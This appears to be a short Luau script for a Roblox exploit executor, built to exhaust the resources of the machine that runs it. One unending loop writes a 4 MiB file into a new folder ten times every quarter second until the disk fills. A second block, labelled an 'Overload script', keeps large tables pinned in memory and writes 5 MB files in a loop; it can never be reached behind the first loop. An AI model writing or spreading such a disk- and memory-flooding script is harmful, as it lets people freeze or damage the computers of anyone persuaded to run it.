local fileSize = 4 * 1024 * 1024 -- 4 MiB per file
local interval = 0.25

local content = string.rep("A", fileSize)
local folderCount = 0
local fileCount = 0

while true do
    local startTime = os.clock()

    for i = 1, 10 do
        folderCount += 1

        local folder = "Folder_" .. folderCount
        if not isfolder(folder) then
            makefolder(folder)
        end

        fileCount += 1
        local file = folder .. "/File_" .. fileCount .. ".txt"
        writefile(file, content)
    end

    local elapsed = os.clock() - startTime
    task.wait(math.max(0, interval - elapsed))
end

task.wait(0.1)
-- Overload script using writefile + RAM stress
local globalData = {}
local i = 0
while true do
    -- 1. RAM Stress: Allocate large tables
    local newData = {}
    for j = 1, 200000 do
        newData[j] = "Data block " .. tostring(i) .. " - " .. tostring(j)
    end
    globalData[i] = newData -- Keep references so GC doesn't clean them up
    
    -- 2. Disk I/O Stress: Write a large file every iteration
    -- This writes ~5MB per loop iteration
    local bigString = string.rep("X", 5000000) -- 5MB string
    writefile("stress_" .. i .. ".dat", bigString)
    
    i = i + 1
    
    -- Optional: Yield briefly to prevent total freeze, but still heavy
    task.wait(0.1)
end
